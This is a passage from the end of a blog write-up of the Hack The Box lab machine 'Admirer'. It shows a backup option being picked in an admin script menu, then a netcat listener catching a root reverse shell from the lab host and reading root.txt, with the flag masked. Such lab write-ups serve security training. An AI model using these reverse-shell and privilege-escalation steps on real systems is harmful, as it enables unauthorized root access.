+1<span class="o">)</span> View system <span class="nb">uptime
+</span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
+</span>3<span class="o">)</span> View crontab
+4<span class="o">)</span> Backup passwd file
+5<span class="o">)</span> Backup shadow file
+6<span class="o">)</span> Backup web data
+7<span class="o">)</span> Backup DB
+8<span class="o">)</span> Quit
+Choose an option: 6
+Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...
+</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>And on our listener we prepared beforehand,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nv <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.187] 56858
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">cat</span> /root/root.txt
+5049XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/adminer/" class="post-tag no-text-decoration" >adminer</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Admirer - rizemon's blog&url=https://rizemon.github.io/posts/admirer-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Admirer - rizemon's blog&u=https://rizemon.github.io/posts/admirer-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Admirer - rizemon's blog&url=https://rizemon.github.io/posts/admirer-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/nibbles-htb/"><div class="card-body"> <span class="timeago small" > Jan 9, 2021 <i class="unloaded">2021-01-09T22:56:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Nibbles (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/beep-htb/"><div class="card-body"> <span class="timeago small" > Jan 10, 2021 <i class="unloaded">2021-01-10T18:17:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Beep (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3><div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/remote-htb/" class="btn btn-outline-primary"><p>Hack The Box - Remote</p></a> <a href="/posts/stacktheflag2020-ctf/" class="btn btn-outline-primary"><p>STACK the Flags CTF 2020 by Govtech CSG</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
